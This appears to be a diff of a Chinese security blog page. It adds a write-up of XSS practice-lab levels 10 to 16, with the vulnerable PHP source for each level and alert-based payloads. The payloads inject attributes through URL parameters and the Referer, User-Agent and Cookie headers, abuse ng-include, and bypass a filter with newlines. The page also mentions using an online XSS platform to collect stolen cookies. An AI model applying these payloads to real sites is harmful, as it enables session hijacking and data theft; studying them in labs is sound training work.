+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/13.png"><br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/14.png"></p>
+<h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a><font size="4"><strong>level10</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str22</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str33</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>
+&lt;form id=search>
+&lt;input name="t_link"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;input name="t_history"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;input name="t_sort"  value="'</span><span class="token keyword">.</span><span class="token variable">$str33</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level10.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/15.png"></p>
+<p>看到这个就知道是要测试出要提交的是哪一个表单，由于源码中我们已经知道是通过t_sort表单提交的数据。</p>
+<pre class=" language-bash"><code class="language-bash">?keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&amp;</span>t_sort<span class="token operator">=</span><span class="token string">" type="</span>text<span class="token string">" onclick="</span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/16.png"></p>
+<h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a><font size="4"><strong>level11</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str22</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str33</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>
+&lt;form id=search>
+&lt;input name="t_link"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;input name="t_history"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;input name="t_sort"  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span>.<span class="token string">'" type="hidden">
+&lt;input name="t_ref"  value="'</span><span class="token keyword">.</span><span class="token variable">$str33</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level11.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+</code></pre>
+<p>这一关卡和上面的一关非常的像多了一个input表单的信息，在服务器端还将请求头中的referer头的值赋给了str11这个变量，$_SERVER[‘HTTP_REFERER’]  #链接到当前页面的前一页面的 URL 地址，也就是说这里可以做点文章。在将变量值中的&lt;和&gt;删除之后就会插入到t_ref这个标签的value属性值中。而上一关的t_sort标签虽然也能接收并显示参数值，但是这个参数值是要用htmlspecialchars()函数处理的。</p>
+<p>抓包分析<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/17.png"></p>
+<p>可以看到的是数据包中没得关于refer的信息我们构造一个refer的数据包发送出去<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/18.png"></p>
+<p>构造payload代码</p>
+<pre class=" language-bash"><code class="language-bash">referer:<span class="token string">"type="</span>text<span class="token string">" onclick="</span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/19.png"></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_ref"</span>  value<span class="token operator">=</span><span class="token string">""</span>type<span class="token operator">=</span><span class="token string">"text"</span> onclick<span class="token operator">=</span><span class="token string">"alert('xss')"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/20.png"></p>
+<h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a><font size="4"><strong>level12</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str22</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str33</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>
+&lt;form id=search>
+&lt;input name="t_link"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;input name="t_history"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;input name="t_sort"  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span>.<span class="token string">'" type="hidden">
+&lt;input name="t_ua"  value="'</span><span class="token keyword">.</span><span class="token variable">$str33</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level12.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p>用户访问服务器时,利用PHP的超级全局变量$_SERVER数组中字段[‘HTTP_USER_AGENT’] 获取访问用户的所有信息通过http头获取user-agent字段的值作为t_ua的value，利用burp抓包，修改http的头部的user-agent字段。</p>
+<p>正常抓包执行<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/21.png"></p>
+<p>修改user-agent信息</p>
+<pre class=" language-bash"><code class="language-bash">user-agent: t_sort<span class="token operator">=</span>2<span class="token string">" onclick="</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token string">" type="</span>text"
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/22.png"></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_ua"</span>  value<span class="token operator">=</span><span class="token string">"t_sort=2"</span> onclick<span class="token operator">=</span><span class="token string">"alert(1)"</span> type<span class="token operator">=</span><span class="token string">"text"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/23.png"></p>
+<h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a><font size="4"><strong>level13</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+setcookie<span class="token punctuation">(</span><span class="token string">"user"</span>, <span class="token string">"call me maybe?"</span>, time<span class="token punctuation">(</span><span class="token punctuation">)</span>+3600<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$str22</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">">"</span>,<span class="token string">""</span>,<span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str33</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span>,<span class="token string">""</span>,<span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"相关的结果.&lt;/h2>"</span><span class="token keyword">.</span><span class="token string">'&lt;center>
+&lt;form id=search>
+&lt;input name="t_link"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;input name="t_history"  value="'</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;input name="t_sort"  value="'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span>.<span class="token string">'" type="hidden">
+&lt;input name="t_cook"  value="'</span><span class="token keyword">.</span><span class="token variable">$str33</span><span class="token keyword">.</span><span class="token string">'" type="hidden">
+&lt;/form>
+&lt;/center>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level13.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p>通过http头获取cookie字段的值作为t_cook的value，利用burp抓包，修改http的头部cookie字段。</p>
+<p>正常抓包<br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/24.png"></p>
+<p>修改数据包</p>
+<pre class=" language-bash"><code class="language-bash">cookie: user<span class="token operator">=</span>2<span class="token string">" onclick="</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token string">" type="</span>text"
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/25.png"></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_cook"</span>  value<span class="token operator">=</span><span class="token string">"2"</span> onclick<span class="token operator">=</span><span class="token string">"alert(1)"</span> type<span class="token operator">=</span><span class="token string">"text"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/26.png"></p>
+<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a><font size="4"><strong>level14</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>html<span class="token operator">></span>
+<span class="token operator">&lt;</span>head<span class="token operator">></span>
+<span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"content-type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=utf-8"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>title<span class="token operator">></span>欢迎来到level14<span class="token operator">&lt;</span>/title<span class="token operator">></span>
+<span class="token operator">&lt;</span>/head<span class="token operator">></span>
+<span class="token operator">&lt;</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span>h1 align<span class="token operator">=</span>center<span class="token operator">></span>欢迎来到level14<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>iframe name<span class="token operator">=</span><span class="token string">"leftframe"</span> marginwidth<span class="token operator">=</span>10 marginheight<span class="token operator">=</span>10 src<span class="token operator">=</span><span class="token string">"http://www.exifviewer.org/"</span> frameborder<span class="token operator">=</span>no width<span class="token operator">=</span><span class="token string">"80%"</span> scrolling<span class="token operator">=</span><span class="token string">"no"</span> height<span class="token operator">=</span>80%<span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span>这关成功后不会自动跳转。成功者<span class="token operator">&lt;</span>a href<span class="token operator">=</span>/xss/level15.php?src<span class="token operator">=</span>1.gif<span class="token operator">></span>点我进level15<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/html<span class="token operator">></span>
+</code></pre>
+<p>漏洞描述：修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试</p>
+<h4 id="level15"><a href="#level15" class="headerlink" title="level15"></a><font size="4"><strong>level15</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>html ng-app<span class="token operator">></span>
+<span class="token operator">&lt;</span>head<span class="token operator">></span>
+        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span>
+        <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"angular.min.js"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>
+window.alert <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+confirm<span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ window.location.href<span class="token operator">=</span><span class="token string">"level16.php?keyword=test"</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+<span class="token operator">&lt;</span>/script<span class="token operator">></span>
+<span class="token operator">&lt;</span>title<span class="token operator">></span>欢迎来到level15<span class="token operator">&lt;</span>/title<span class="token operator">></span>
+<span class="token operator">&lt;</span>/head<span class="token operator">></span>
+<span class="token operator">&lt;</span>h1 align<span class="token operator">=</span>center<span class="token operator">></span>欢迎来到第15关，自己想个办法走出去吧！<span class="token operator">&lt;</span>/h1<span class="token operator">></span>
+<span class="token operator">&lt;</span>p align<span class="token operator">=</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level15.png<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">'&lt;body>&lt;span class="ng-include:'</span>.htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>.<span class="token string">'">&lt;/span>&lt;/body>'</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<pre class=" language-bash"><code class="language-bash">从源码中可以看到的是传递参数src
+
+1、ng-include 指令用于包含外部的 HTML文件。
+
+2、包含的内容将作为指定元素的子节点。
+
+3、ng-include 属性的值可以是一个表达式，返回一个文件名。
+
+4、默认情况下，包含的文件需要包含在同一个域名下。
+
+特别值得注意的几点如下：
+
+1.ng-include,如果单纯指定地址，必须要加引号
+
+2.ng-include,加载外部html，script标签中的内容不执行
+
+3.ng-include,加载外部html中含有style标签样式可以识别
+
+构造函数
+?src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(1)>'</span>
+因为这里参数值算是一个地址，所以需要添加引号。
+
+但是level1.php不是一个php文件吗？
+
+这里解释一下
+
+这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参
+
+数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的
+
+html文件给包含进来的意思。
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/27.png"></p>
+<h4 id="level16"><a href="#level16" class="headerlink" title="level16"></a><font size="4"><strong>level16</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+ini_set<span class="token punctuation">(</span><span class="token string">"display_errors"</span>, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str2</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"script"</span>,<span class="token string">"&amp;nbsp;"</span>,<span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str3</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">" "</span>,<span class="token string">"&amp;nbsp;"</span>,<span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str4</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"/"</span>,<span class="token string">"&amp;nbsp;"</span>,<span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$str5</span><span class="token operator">=</span>str_replace<span class="token punctuation">(</span><span class="token string">"     "</span>,<span class="token string">"&amp;nbsp;"</span>,<span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;center>"</span><span class="token keyword">.</span><span class="token variable">$str5</span><span class="token keyword">.</span><span class="token string">"&lt;/center>"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+<span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>level16.png<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span>
+<span class="token operator">&lt;</span>?php
+<span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span>.strlen<span class="token punctuation">(</span><span class="token variable">$str5</span><span class="token punctuation">)</span>.<span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<pre class=" language-bash"><code class="language-bash">将参数值中的script替换成<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>
+将参数值中的空格也替换成<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>
+将参数值中的/符号替换成<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>
+
+绕过思路：可以用回车来将它们分开。
+<span class="token operator">&lt;</span>img%0Asrc<span class="token operator">=</span>1%0Aonerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>
+</code></pre>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img%0Asrc<span class="token operator">=</span>1%0Aonerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/28.png"></p>
+<h3 id="jfdd靶场"><a href="#jfdd靶场" class="headerlink" title="jfdd靶场"></a><font size="5"><strong>jfdd靶场</strong></font></h3><p><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/29.png"><br><img src="/2023/10/09/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-026/30.png"></p>
+<p>注册xss平台账号，当然也可以自己搭建<a target="_blank" rel="noopener" href="https://xss8.cc/register/,%E8%BF%99%E6%A0%B7%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%B8%AE%E6%88%91%E4%BB%AC%E6%8E%A5%E5%8F%97%E7%BD%91%E7%AB%99%E7%9A%84cookie%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%9C%A8%E7%BA%BF%E7%9A%84xss%E5%B9%B3%E5%8F%B0%E4%BD%9C%E4%B8%BA%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B7%A5%E5%85%B7%E7%9B%97%E5%8F%96%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%90%8C%E6%97%B6%E4%B9%9F%E5%AD%98%E5%9C%A8%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E8%BF%87%E7%A8%8B%E5%BD%93%E4%B8%AD%E6%88%91%E4%BB%AC%E8%8E%B7%E5%8F%96%E7%9A%84%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%9C%89%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E8%BF%99%E4%BA%9B%E5%B9%B3%E5%8F%B0%E7%99%BD%E5%AB%96%EF%BC%8C%E8%BF%98%E6%9C%89%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E5%9C%A8%E7%BD%91%E4%B8%8A%E4%B8%8B%E8%BD%BD%E7%9A%84xss(%E6%88%96%E8%80%85%E6%98%AF%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7)%E5%BE%88%E6%9C%89%E5%8F%AF%E8%83%BD%E6%98%AF%E5%B8%A6%E5%90%8E%E9%97%A8%E7%9A%84%E3%80%82">https://xss8.cc/register/,这样的在线网站可以帮我们接受网站的cookie，也就是说我们可以通过在线的xss平台作为第三方工具盗取网站信息，同时也存在一些问题就是我们的渗透测试的过程当中我们获取的网站信息有可能会被这些平台白嫖，还有就是我们在网上下载的xss(或者是其他工具)很有可能是带后门的。</a></p>
+<p>由于上面的靶场，各种各样的问题导致环境根本无法运行起来，我也没找到合适的替代靶场只有先截图和文字记录。</p>
+
                 
             </div>
             <hr/>
@@ -556,7 +996,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -741,7 +1185,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            WEB漏洞-XSS跨站之订单及Shell箱子反杀记
                         
                     </div>
                     <div class="publish-info">
@@ -750,13 +1194,25 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            爱睡懒觉的道士
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -779,7 +1235,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            WEB漏洞-XSS跨站之原理分类及攻击手法
                         
                     </div>
                     <div class="publish-info">
@@ -788,11 +1244,23 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            爱睡懒觉的道士
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1030,7 +1498,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">37.9k</span>&nbsp;字
+                class="white-color">43.6k</span>&nbsp;字
             
             
             
